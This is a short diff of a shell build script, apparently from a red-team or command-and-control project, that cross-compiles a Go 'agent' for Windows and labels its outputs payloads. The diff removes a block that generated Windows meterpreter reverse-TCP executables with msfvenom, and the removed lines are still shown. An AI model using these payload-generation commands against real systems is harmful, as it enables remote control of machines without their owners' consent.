@@ -34,24 +34,7 @@ GOOS=windows GOARCH=386 go build \
 
 echo "[+] Built: $OUTPUT_DIR/agent_x86.exe"
 
-# Optional: use msfvenom to generate payloads if available
-if command -v msfvenom &> /dev/null; then
-    echo "[*] Generating msfvenom payloads..."
-
-    # Windows x64 meterpreter reverse TCP
-    echo "[+] Generating meterpreter x64..."
-    msfvenom -p windows/x64/meterpreter/reverse_tcp \
-        LHOST=127.0.0.1 LPORT=4444 \
-        -f exe -o "$OUTPUT_DIR/meterpreter_x64.exe" 2>/dev/null || true
-
-    # Windows x86 meterpreter reverse TCP
-    echo "[+] Generating meterpreter x86..."
-    msfvenom -p windows/meterpreter/reverse_tcp \
-        LHOST=127.0.0.1 LPORT=4444 \
-        -f exe -o "$OUTPUT_DIR/meterpreter_x86.exe" 2>/dev/null || true
-else
-    echo "[!] msfvenom not found, skipping meterpreter payloads"
-fi
+# Only our Go agent is built; external payload generators are not invoked.
 
 echo "[✓] Payloads built successfully"
 echo ""
